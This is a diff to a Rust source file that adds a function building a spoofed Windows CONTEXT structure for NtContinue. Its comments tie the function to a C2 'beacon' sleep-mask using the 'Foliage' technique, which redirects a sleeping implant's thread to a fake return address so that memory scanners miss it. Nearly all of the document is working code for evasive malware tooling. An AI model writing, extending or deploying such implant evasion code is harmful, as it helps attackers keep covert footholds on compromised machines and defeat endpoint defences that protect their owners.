@@ -123,6 +123,29 @@ const _: () = assert!(core::mem::align_of::<Context>() == 16, "CONTEXT must be 1
 // assert proves the buffer backing those offsets is correct.
 const _: () = assert!(1232 == 0x4D0, "1232 == 0x4D0");
 
+/// Build a spoofed CONTEXT for NtContinue: RIP = `target_rip` (a .pdata gap
+/// address), with minimal valid flags so NtContinue accepts it. The CONTEXT is
+/// leaked (Box::into_raw) because it must survive across the APC delivery
+/// boundary (the beacon thread reads it when NtContinue fires).
+///
+/// Only RIP + ContextFlags are set — all other registers are zero. This is
+/// intentional: NtContinue with a zeroed CONTEXT + spoofed RIP is the Foliage
+/// technique's "context reset" — the beacon resumes at `target_rip` with a
+/// clean register file (its real state was saved by the helper beforehand or
+/// is irrelevant for the sleep-mask purpose, since the beacon re-enters its
+/// sleep loop after waking).
+///
+/// # Safety
+/// The returned `*mut Context` is leaked (never freed). This is acceptable for
+/// a per-sleep CONTEXT (one per sleep cycle, process lifetime is short). A
+/// production variant would use a static buffer pool.
+pub unsafe fn spoofed_context(target_rip: u64) -> *mut Context {
+    let mut ctx = Context::default();
+    ctx.set_context_flags(CONTEXT_AMD64 | 0x1 /* CONTEXT_CONTROL */);
+    ctx.set_rip(target_rip);
+    alloc::boxed::Box::into_raw(alloc::boxed::Box::new(ctx))
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
